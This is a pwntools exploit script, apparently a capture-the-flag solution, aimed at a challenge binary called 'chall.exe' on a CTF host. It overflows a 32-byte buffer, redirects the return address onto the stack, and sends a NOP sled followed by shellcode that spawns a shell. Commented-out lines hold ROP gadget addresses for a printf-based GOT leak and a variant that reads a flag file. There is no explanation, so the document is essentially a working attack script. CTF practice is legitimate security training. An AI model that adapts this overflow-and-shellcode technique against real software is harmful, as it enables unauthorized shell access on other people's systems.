# -- coding: utf-8 --
from pwn import *
context.log_level = 'debug'
# ENV
HOST =  "pyttemjuk-1.play.hfsc.tf"
PORT = 1337

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    r = remote(HOST, PORT)
else:
    r = process("chall.exe")
    pause()

# VARIABLE

# PAYLOAD
main=0x401575
ret =0x00401000
pop_edi =0x00401a94
# pop_edx =
pop_eax_ecx =0x004025f7
setbuf_got= 0x4061A4
printf_plt =0x402624
pop_esp =0x00401e73 #: pop esp ; and al, 0x20 ; add esp, 0x18 ; pop ebx ; jmp eax
# raw_input('>')

# payload = b"a"*32+p32(pop_edi) + p32(setbuf_got)+ p32(pop_eax_ecx)+ b"%s" +p32(0)+  p32(printf_plt) +p32(main)
# payload = b"a"*32+p32(main)
payload = b"a"*32 + p32(0x0060FED8+320)
# +p32(0x60Fef9)
payload =payload.ljust(1000,b"\x90")
# payload+= asm(shellcraft.i386.linux.cat("/mnt/c/flag.txt"))
payload+=asm(shellcraft.i386.linux.sh())
r.sendlineafter(b"Enter your name: ",payload)

r.interactive()